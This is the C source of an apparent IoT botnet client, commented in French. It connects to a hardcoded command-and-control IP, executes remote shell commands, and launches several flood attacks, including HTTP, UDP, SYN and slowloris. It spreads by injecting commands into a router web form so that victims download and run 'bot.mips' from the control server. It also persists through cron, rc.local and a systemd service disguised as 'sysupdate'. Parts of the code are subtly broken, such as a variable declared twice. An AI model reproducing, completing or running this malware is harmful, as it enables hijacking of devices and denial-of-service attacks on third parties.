/* Définitions nécessaires pour la compilation croisée */
#define _GNU_SOURCE
#define _DEFAULT_SOURCE
#define __USE_GNU

/* Configuration */
#define BUFFER_SIZE 1024
#define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
#define MIN_PACKET_SIZE (1024)             // 1KB min

/* Headers système */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <dirent.h>

// Déclarations des fonctions
void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
void http_flood(char* target, int port, int duration);
void syn_flood(char* target, int port, int duration);
void udp_flood(char* target, int port, int duration);

#define C2_SERVER "51.68.128.169"
#define C2_PORT 1337
#define BUFFER_SIZE 1024
#define CMD_SIZE 512

// Fonction pour exécuter une commande shell et retourner la sortie
char* execute_command(char* command) {
    FILE* fp;
    char* output = malloc(BUFFER_SIZE * 10);
    char buffer[BUFFER_SIZE];
    
    if (!output) return NULL;
    memset(output, 0, BUFFER_SIZE * 10);
    
    fp = popen(command, "r");
    if (fp == NULL) {
        sprintf(output, "Failed to execute command\n");
        return output;
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(output, buffer);
    }
    
    pclose(fp);
    return output;
}

// Fonction pour scanner un sous-réseau à la recherche d'hôtes vulnérables
void scan_network(int c2_socket, char* subnet) {
    char command[BUFFER_SIZE];
    char* output;
    
    // Construire la commande de scan
    sprintf(command, "for i in {1..254}; do ping -c 1 -W 1 %s.$i | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" & done", subnet);
    
    // Exécuter la commande et obtenir la sortie
    output = execute_command(command);
    
    // Envoyer les résultats au serveur C2
    if (output) {
        char message[BUFFER_SIZE * 10];
        sprintf(message, "SCAN_RESULT|%s", output);
        send(c2_socket, message, strlen(message), 0);
        free(output);
    }
}

// Fonction pour effectuer une attaque HTTP flood
void http_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    char request[BUFFER_SIZE];
    
    // Construire la requête HTTP
    snprintf(request, BUFFER_SIZE,
        "GET /?%d HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n\r\n",
        rand(), target);
    
    // Configurer l'adresse
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
                send(sock, request, strlen(request), 0);
            }
            close(sock);
        }
        usleep(1000); // Petit délai pour ne pas surcharger le système
    }
}

// Fonction pour effectuer une attaque SYN flood
void syn_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    
    // Créer un socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1) {
        return;
    }
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        // Envoyer des paquets SYN
        sendto(sock, NULL, 0, 0, (struct sockaddr*)&addr, sizeof(addr));
        usleep(1000);
    }
    close(sock);
}

// Fonction pour effectuer une attaque UDP flood
void udp_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    char packet[1024];
    
    // Remplir le paquet avec des données aléatoires
    for (int i = 0; i < sizeof(packet); i++) {
        packet[i] = rand() % 255;
    }
    
    // Créer le socket UDP
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr));
        usleep(100);
    }
    close(sock);
}

// Fonction pour effectuer une attaque TCP flood
void tcp_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock != -1) {
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1) {
                char *data = malloc(1024);
                if (data) {
                    for (int i = 0; i < 1024; i++) {
                        data[i] = rand() % 256;
                    }
                    send(sock, data, 1024, 0);
                    free(data);
                }
            }
            close(sock);
        }
        usleep(100);
    }
}

// Fonction pour effectuer une attaque DDoS
#ifndef __USE_MISC
#define __USE_MISC
#endif

#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif

void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
    struct sockaddr_in target_addr;
    char message[BUFFER_SIZE];
    char* attack_packet = NULL;
    int packet_size = 0;
    int sock;
    time_t start_time;
    
    // Initialisation
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target);
    start_time = time(NULL);
    
    // Tailles des paquets pour les attaques
    int packet_sizes[] = {MAX_PACKET_SIZE, 512*1024, 64*1024, MIN_PACKET_SIZE};
    
    for (int i = 0; i < sizeof(packet_sizes)/sizeof(int); i++) {
        packet_size = packet_sizes[i];
        attack_packet = (char*)malloc(packet_size);
        if (attack_packet != NULL) {
            break;
        }
    }
    
    if (attack_packet == NULL) {
        snprintf(message, sizeof(message), "DDOS_ERROR|%s:%d|NO_MEMORY", target, port);
        send(c2_socket, message, strlen(message), 0);
        return;
    }
    
    // Remplir le paquet avec des données aléatoires
    for (int i = 0; i < packet_size; i++) {
        attack_packet[i] = rand() % 256;
    }
    
    // Informer le serveur C2 du début de l'attaque
    char message[BUFFER_SIZE];
    snprintf(message, sizeof(message), "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
    send(c2_socket, message, strlen(message), 0);
    
    if (strcmp(method, "http") == 0) {
        // Attaque HTTP optimisée pour IoT
        char *paths[] = {"/", "/index.php", "/home", "/api", "/login"};
        char *user_agents[] = {
            "Mozilla/5.0",
            "Googlebot/2.1",
            "bingbot/2.0",
            "Apache-HttpClient/4.5.2",
            "curl/7.64.1"
        };
        
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
            if (sock != -1) {
                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                    char request[256];
                    snprintf(request, sizeof(request),
                        "GET %s?%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: close\r\n\r\n",
                        paths[rand() % 5],
                        rand(),
                        target,
                        user_agents[rand() % 5]);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            usleep(10000); // 10ms délai
        }
    }
    else if (strcmp(method, "slowloris") == 0) {
        // Slowloris - garde les connexions ouvertes longtemps
        int max_sockets = 128;
        int *sockets = (int*)malloc(max_sockets * sizeof(int));
        int active_sockets = 0;
        
        while (time(NULL) - start_time < duration) {
            // Maintenir ~128 connexions
            while (active_sockets < max_sockets) {
                sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
                if (sock != -1) {
                    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                        char partial_header[64];
                        snprintf(partial_header, sizeof(partial_header),
                            "GET / HTTP/1.1\r\n"
                            "Host: %s\r\n", target);
                        send(sock, partial_header, strlen(partial_header), 0);
                        sockets[active_sockets++] = sock;
                    } else {
                        close(sock);
                    }
                }
            }
            
            // Envoyer des en-têtes partiels pour maintenir les connexions
            for (int i = 0; i < active_sockets; i++) {
                send(sockets[i], "X-a: b\r\n", 8, 0);
            }
            
            sleep(10); // Attendre 10s avant la prochaine vague
            
            // Nettoyer les sockets morts
            for (int i = 0; i < active_sockets; i++) {
                if (send(sockets[i], "", 0, 0) < 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    i--;
                }
            }
        }
        
        // Nettoyer
        for (int i = 0; i < active_sockets; i++) {
            close(sockets[i]);
        }
        free(sockets);
    }
    else if (strcmp(method, "ack") == 0) {
        // ACK flood
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
            if (sock != -1) {
                connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                send(sock, attack_packet, 64, 0); // Juste 64 octets
                close(sock);
            }
            usleep(5000); // 5ms délai
        }
    }
    else if (strcmp(method, "mix") == 0) {
        // Mix d'attaques optimisé pour performance maximale
        int num_threads = 4; // Nombre de threads d'attaque
        int active_sockets[4] = {0}; // Sockets par thread
        
        while (time(NULL) - start_time < duration) {
            for (int t = 0; t < num_threads; t++) {
                // Alterner entre TCP et UDP
                int proto = (t + (int)time(NULL)) % 2;
                sock = socket(AF_INET, 
                            proto ? SOCK_STREAM | SOCK_NONBLOCK : SOCK_DGRAM,
                            proto ? 0 : IPPROTO_UDP);
                
                if (sock != -1) {
                    if (proto) { // TCP
                        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                            send(sock, attack_packet, packet_size, 0);
                        }
                    } else { // UDP
                        sendto(sock, attack_packet, packet_size, 0,
                               (struct sockaddr*)&target_addr, sizeof(target_addr));
                    }
                    
                    if (active_sockets[t]) {
                        close(active_sockets[t]);
                    }
                    active_sockets[t] = sock;
                }
            }
            usleep(1000); // 1ms délai
        }
        
        // Nettoyer les sockets
        for (int t = 0; t < num_threads; t++) {
            if (active_sockets[t]) {
                close(active_sockets[t]);
            }
        }
    }
    else if (strcmp(method, "udp") == 0) {
        // Attaque UDP améliorée avec paquets de 5MB
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock != -1) {
            while (time(NULL) - start_time < duration) {
                sendto(sock, attack_packet, packet_size, 0,
                       (struct sockaddr*)&target_addr, sizeof(target_addr));
                usleep(1000); // 1ms délai
            }
            close(sock);
        }
    }
    
    // Informer le serveur C2 de la fin de l'attaque
    snprintf(message, sizeof(message), "DDOS_COMPLETED|%s:%d|%s", target, port, method);
    send(c2_socket, message, strlen(message), 0);
}

// Fonction pour propager le bot
// Propagation automatique sur le réseau local
void auto_propagate() {
    char localnet[32] = "";
    FILE* f = popen("ip -4 addr | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1 | cut -d'.' -f1-3", "r");
    if (f && fgets(localnet, sizeof(localnet), f)) {
        localnet[strcspn(localnet, "\n")] = 0;
        char ip[64];
        char cmd[CMD_SIZE];
        char base_payload[CMD_SIZE];
        
        // Préparer le payload de base
        snprintf(base_payload, sizeof(base_payload), 
            "rm -rf /var/tmp/bot;%%s http://%s:1337/bot.mips%%s/var/tmp/bot;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
            C2_SERVER);
        
        for (int i = 1; i < 255; i++) {
            snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
            
            // Préparer les commandes
            char wget_cmd[CMD_SIZE];
            char curl_cmd[CMD_SIZE];
            
            snprintf(wget_cmd, sizeof(wget_cmd), base_payload, "wget", " -O ");
            snprintf(curl_cmd, sizeof(curl_cmd), base_payload, "curl -O", ";");
            
            // Essayer wget
            if (snprintf(cmd, sizeof(cmd),
                "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3B%s' > /dev/null 2>&1",
                ip, wget_cmd) < sizeof(cmd)) {
                system(cmd);
            }
            
            // Essayer curl
            if (snprintf(cmd, sizeof(cmd),
                "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3B%s' > /dev/null 2>&1",
                ip, curl_cmd) < sizeof(cmd)) {
                system(cmd);
            }
            
            // Essayer tftp
            if (snprintf(cmd, sizeof(cmd),
                "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1",
                ip) < sizeof(cmd)) {
                system(cmd);
            }
        }
    }
    if (f) pclose(f);
}

void propagate(int c2_socket, char* target) {
    // Propagation classique sur une cible précise (pour compatibilité)
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bwget%%20http://%s:1337/bot.mips%%20-O%%20->/var/tmp/bot%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", target, C2_SERVER);
    system(cmd);
} 

// Fonction pour collecter des informations sur le système
char* collect_system_info() {
    char* info = malloc(BUFFER_SIZE * 5);
    char* cmd_output;
    
    if (!info) return NULL;
    memset(info, 0, BUFFER_SIZE * 5);
    
    // Obtenir le nom d'hôte
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    sprintf(info, "Hostname: %s\n", hostname);
    
    // Obtenir les informations CPU
    cmd_output = execute_command("cat /proc/cpuinfo | grep 'model name' | head -1");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations mémoire
    cmd_output = execute_command("free -m | head -2");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations réseau
    cmd_output = execute_command("ifconfig | grep inet");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    return info;
}

// Fonction principale pour se connecter au serveur C2 et traiter les commandes
void connect_to_c2() {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char* system_info;
    
    while (1) {
        // Créer un socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(30);
            continue;
        }
        
        // Configurer l'adresse du serveur C2
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        
        // Convertir l'adresse IP en format binaire
        if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Se connecter au serveur C2
        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Collecter les informations système
        system_info = collect_system_info();
        
        // Envoyer les informations d'identification
        if (system_info) {
            char bot_id[BUFFER_SIZE * 5];
            sprintf(bot_id, "BOT_CONNECTED|%s", system_info);
            send(sockfd, bot_id, strlen(bot_id), 0);
            free(system_info);
        } else {
            send(sockfd, "BOT_CONNECTED|Unknown Device", 28, 0);
        }
        
        // Boucle principale pour recevoir et exécuter les commandes
        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            
            // Recevoir une commande du serveur C2
            int n = recv(sockfd, buffer, BUFFER_SIZE-1, 0);
            if (n <= 0) {
                break;  // Connexion perdue
            }
            
            buffer[n] = '\0';
            
            // Traiter la commande reçue
            if (strncmp(buffer, "PING", 4) == 0) {
                // Répondre au ping
                send(sockfd, "PONG", 4, 0);
            } else if (strncmp(buffer, "EXEC ", 5) == 0) {
                // Exécuter une commande shell
                char* result = execute_command(buffer + 5);
                if (result) {
                    send(sockfd, result, strlen(result), 0);
                    free(result);
                } else {
                    send(sockfd, "ERROR: Command execution failed", 30, 0);
                }
                send(sockfd, "COMMAND_COMPLETED", 17, 0);
            } else if (strncmp(buffer, "SCAN ", 5) == 0) {
                // Scanner un sous-réseau
                scan_network(sockfd, buffer + 5);
            } else if (strncmp(buffer, "DDOS ", 5) == 0) {
                // Format: DDOS target:port duration
                char target[256];
                int port, duration;
                sscanf(buffer + 5, "%255[^:]:%d %d", target, &port, &duration);
                ddos_attack(sockfd, target, port, duration, "http"); // Méthode par défaut: HTTP flood
            } else if (strncmp(buffer, "PROPAGATE ", 10) == 0) {
                // Propager à une cible spécifique
                propagate(sockfd, buffer + 10);
            } else if (strcmp(buffer, "EXIT") == 0) {
                // Fermer la connexion
                break;
            }
        }
        
        // Fermer le socket et attendre avant de se reconnecter
        close(sockfd);
        sleep(30);
    }
}

// Fonction pour se détacher du terminal et s'exécuter en arrière-plan
void daemonize() {
    pid_t pid, sid;
    
    // Fork et terminer le processus parent
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Créer une nouvelle session
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    
    // Changer le répertoire de travail
    if (chdir("/") < 0) exit(EXIT_FAILURE);
    
    // Fermer les descripteurs de fichiers standard
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

// Fonction pour persister sur le système
void persist() {
    char command[BUFFER_SIZE*4];
    char path[BUFFER_SIZE];
    if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) return;
    // Copie dans plusieurs emplacements
    snprintf(command, sizeof(command), "cp %s /usr/bin/sysupdate; cp %s /bin/sysupdate; cp %s /etc/sysupdate", path, path, path);
    system(command);
    // Ajout à la crontab root
    system("(crontab -l 2>/dev/null; echo '@reboot /usr/bin/sysupdate') | crontab -");
    // Ajout à /etc/rc.local
    FILE *rc = fopen("/etc/rc.local", "a");
    if (rc) { fprintf(rc, "/usr/bin/sysupdate &\n"); fclose(rc); }
    // Création d'un service systemd
    FILE *fp = fopen("/etc/systemd/system/sysupdate.service", "w");
    if (fp) {
        fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/sysupdate\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n");
        fclose(fp);
        system("systemctl enable sysupdate.service 2>/dev/null");
    }
}

int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1) {
        // Spécifique à l'archi si besoin
    }
    persist();
    daemonize();
    // Lancer la propagation automatique en tâche de fond
    if (fork() == 0) {
        while (1) {
            auto_propagate();
            sleep(600); // Toutes les 10 minutes
        }
        exit(0);
    }
    connect_to_c2();
    return 0;
}